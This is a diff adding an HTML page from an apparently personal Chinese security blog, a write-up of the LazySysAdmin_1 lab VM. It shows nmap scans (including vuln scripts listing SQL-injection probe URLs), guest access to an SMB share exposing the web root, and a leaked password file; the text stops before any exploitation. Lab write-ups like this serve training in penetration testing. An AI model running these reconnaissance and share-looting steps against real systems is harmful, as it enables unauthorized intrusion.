@@ -1,0 +1,727 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="LazySysAdmin_1 靶机信息收集12345678910111213141516┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.1.1.130   Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-07-07 08:41 EDTNmap scan report for 192.1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LazySysAdmin_1 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/07/ce627963c73e.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="LazySysAdmin_1 靶机信息收集12345678910111213141516┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.1.1.130   Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-07-07 08:41 EDTNmap scan report for 192.1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/7c671371f20db023a1f7d86475fba849_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/568a6b02c5561718523f1e44276de3f7_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/5505a9e5d26e3d128cfc74a17000298e_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/9e1cbd984f7292f0aac2afff2f1c9e0b_MD5.png">
+<meta property="article:published_time" content="2023-07-07T13:43:55.000Z">
+<meta property="article:modified_time" content="2023-07-10T03:44:30.891Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/7c671371f20db023a1f7d86475fba849_MD5.png">
+  
+  
+  
+  <title>LazySysAdmin_1 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="LazySysAdmin_1 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-07-07 21:43" pubdate>
+          2023年7月7日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          19k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          155 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">LazySysAdmin_1 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="LazySysAdmin-1-靶机"><a href="#LazySysAdmin-1-靶机" class="headerlink" title="LazySysAdmin_1 靶机"></a>LazySysAdmin_1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.130   <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-07 08:41 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.130<br>Host is up (0.0028s latency).<br>Not shown: 65529 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>139/tcp  open  netbios-ssn<br>445/tcp  open  microsoft-ds<br>3306/tcp open  mysql<br>6667/tcp open  irc<br>MAC Address: 00:0C:29:96:E4:E9 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.03 seconds<br></code></pre></td></tr></table></figure>
+
+<p>开放了 22,80,139,445,3306,6667 端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80,139,445,3306,6667 192.1.1.130<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-07 08:43 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.130<br>Host is up (0.00043s latency).<br><br>PORT     STATE SERVICE     VERSION<br>22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 b5:38:66:0f:a1:ee:<span class="hljs-built_in">cd</span>:41:69:3b:82:cf:ad:a1:f7:13 (DSA)<br>|   2048 58:5a:63:69:d0:da:<span class="hljs-built_in">dd</span>:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)<br>|   256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)<br>|_  256 1f:65:c0:<span class="hljs-built_in">dd</span>:15:e6:e4:21:f2:c1:9b:a3:b6:55:a0:45 (ED25519)<br>80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))<br>|_http-generator: Silex v2.2.7<br>| http-robots.txt: 4 disallowed entries <br>|_/old/ /test/ /TR2/ /Backnode_files/<br>|_http-title: Backnode<br>|_http-server-header: Apache/2.4.7 (Ubuntu)<br>139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>445/tcp  open              Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)<br>3306/tcp open  mysql       MySQL (unauthorized)<br>6667/tcp open  irc         InspIRCd<br>| irc-info: <br>|   server: Admin.<span class="hljs-built_in">local</span><br>|   <span class="hljs-built_in">users</span>: 1<br>|   servers: 1<br>|   chans: 0<br>|   lusers: 1<br>|   lservers: 0<br>|   <span class="hljs-built_in">source</span> ident: nmap<br>|   <span class="hljs-built_in">source</span> host: 192.1.1.128<br>|_  error: Closing <span class="hljs-built_in">link</span>: (nmap@192.1.1.128) [Client exited]<br>MAC Address: 00:0C:29:96:E4:E9 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: Hosts: LAZYSYSADMIN, Admin.<span class="hljs-built_in">local</span>; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2023-07-07T12:43:23<br>|_  start_date: N/A<br>|_clock-skew: mean: -3h20m00s, deviation: 5h46m24s, median: 0s<br>| smb-os-discovery: <br>|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br>|   Computer name: lazysysadmin<br>|   NetBIOS computer name: LAZYSYSADMIN\x00<br>|   Domain name: \x00<br>|   FQDN: lazysysadmin<br>|_  System time: 2023-07-07T22:43:23+10:00<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled but not required<br>|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 30.13 seconds<br></code></pre></td></tr></table></figure>
+
+<p>梳理一下信息：Ubuntu 系统，80 端口使用的是 Silex v2.2.7 搭配 apache 搭建的，存在文件 <code>robots.txt</code>，存在目录 <code>/old/ /test/ /TR2/ /Backnode_files/</code>，标题是 Backnode，139 和 445 端口运行着 Samba 并且有一般用户的权限，3306 运行着 MySQL，6667 端口运行着 irc 服务，这个不清楚是什么等会查查资料</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools/LazySysAdmin_1]<br>└─$ sudo nmap --script=vuln -p22,80,139,445,3306,6667 192.1.1.130 <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-07 09:00 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.130<br>Host is up (0.00031s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-slowloris-check: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Slowloris DOS attack</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2007-6750</span><br><span class="hljs-string">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="hljs-string">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="hljs-string">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="hljs-string">|       the http server&#x27;</span>s resources causing Denial Of Service.<br>|       <br>|     Disclosure <span class="hljs-built_in">date</span>: 2009-09-17<br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>|_      http://ha.ckers.org/slowloris/<br>| http-enum: <br>|   /wordpress/: Blog<br>|   /test/: Test page<br>|   /robots.txt: Robots file<br>|   /info.php: Possible information file<br>|   /phpmyadmin/: phpMyAdmin<br>|   /wordpress/wp-login.php: Wordpress login page.<br>|   /apache/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.7 (ubuntu)&#x27;</span><br>|_  /old/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.7 (ubuntu)&#x27;</span><br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-sql-injection: </span><br><span class="hljs-string">|   Possible sqli for queries:</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=D%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=S%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=M%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|_    http://192.1.1.130:80/Backnode_files/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.<br>139/tcp  open  netbios-ssn<br>445/tcp  open  microsoft-ds<br>3306/tcp open  mysql<br>6667/tcp open  irc<br>|_irc-unrealircd-backdoor: Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait <span class="hljs-built_in">set</span> to 100 (or higher <span class="hljs-keyword">if</span> you get this message again).<br>| irc-botnet-channels: <br>|_  ERROR: TIMEOUT<br>MAC Address: 00:0C:29:96:E4:E9 (VMware)<br><br>Host script results:<br>|_smb-vuln-ms10-061: <span class="hljs-literal">false</span><br>| smb-vuln-regsvc-dos: <br>|   VULNERABLE:<br>|   Service regsvc <span class="hljs-keyword">in</span> Microsoft Windows systems vulnerable to denial of service<br>|     State: VULNERABLE<br>|       The service regsvc <span class="hljs-keyword">in</span> Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference<br>|       pointer. This script will crash the service <span class="hljs-keyword">if</span> it is vulnerable. This vulnerability was discovered by Ron Bowes<br>|       <span class="hljs-keyword">while</span> working on smb-enum-sessions.<br>|_          <br>|_smb-vuln-ms10-054: <span class="hljs-literal">false</span><br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 328.29 seconds<br></code></pre></td></tr></table></figure>
+
+<p>多了一些信息：扫出来了 <code>wordpress</code>, <code>test</code>, <code>info.php</code>, <code>phpmyadmin</code>, <code>wordpress/wp-login.php</code>, <code>apache</code>, <code>old</code> 目录和文件，接下来先从 smb 入手吧</p>
+<h2 id="smb-渗透"><a href="#smb-渗透" class="headerlink" title="smb 渗透"></a>smb 渗透</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo smbmap -H 192.1.1.130        <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>[+] Guest session       IP: 192.1.1.130:445     Name: 192.1.1.130                                       <br>        Disk                                                    Permissions     Comment<br>        ----                                                    -----------     -------<br>        <span class="hljs-built_in">print</span>$                                                  NO ACCESS       Printer Drivers<br>        share$                                                  READ ONLY       Sumshare<br>        IPC$                                                    NO ACCESS       IPC Service (Web server)<br></code></pre></td></tr></table></figure>
+
+<p>得到了一个特殊目录 <code>share$</code>，尝试 smbclient 来连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ smbclient //192.1.1.130/share$    <br>Password <span class="hljs-keyword">for</span> [WORKGROUP\kali]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Tue Aug 15 07:05:52 2017<br>  ..                                  D        0  Mon Aug 14 08:34:47 2017<br>  wordpress                           D        0  Tue Aug 15 07:21:08 2017<br>  Backnode_files                      D        0  Mon Aug 14 08:08:26 2017<br>  wp                                  D        0  Tue Aug 15 06:51:23 2017<br>  deets.txt                           N      139  Mon Aug 14 08:20:05 2017<br>  robots.txt                          N       92  Mon Aug 14 08:36:14 2017<br>  todolist.txt                        N       79  Mon Aug 14 08:39:56 2017<br>  apache                              D        0  Mon Aug 14 08:35:19 2017<br>  index.html                          N    36072  Sun Aug  6 01:02:15 2017<br>  info.php                            N       20  Tue Aug 15 06:55:19 2017<br>  <span class="hljs-built_in">test</span>                                D        0  Mon Aug 14 08:35:10 2017<br>  old                                 D        0  Mon Aug 14 08:35:13 2017<br><br>                3029776 blocks of size 1024. 1456476 blocks available<br>smb: \&gt;<br></code></pre></td></tr></table></figure>
+
+<p>竟然有那么多东西，根据 robots.txt 大概判断出这是网站根目录被共享了出来。首先把几个 txt 下载到本地查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools/LazySysAdmin_1]<br>└─$ <span class="hljs-built_in">cat</span> deets.txt                           <br>CBF Remembering all these passwords.<br><br>Remember to remove this file and update your password after we push out the server.<br><br>Password 12345<br><br>┌──(kali㉿kali)-[~/tools/LazySysAdmin_1]<br>└─$ <span class="hljs-built_in">cat</span> todolist.txt <br>Prevent <span class="hljs-built_in">users</span> from being able to view to web root using the <span class="hljs-built_in">local</span> file browser<br><br>┌──(kali㉿kali)-[~/tools/LazySysAdmin_1]<br>└─$ <span class="hljs-built_in">cat</span> robots.txt <br>User-agent: *<br>Disallow: /old/<br>Disallow: /test/<br>Disallow: 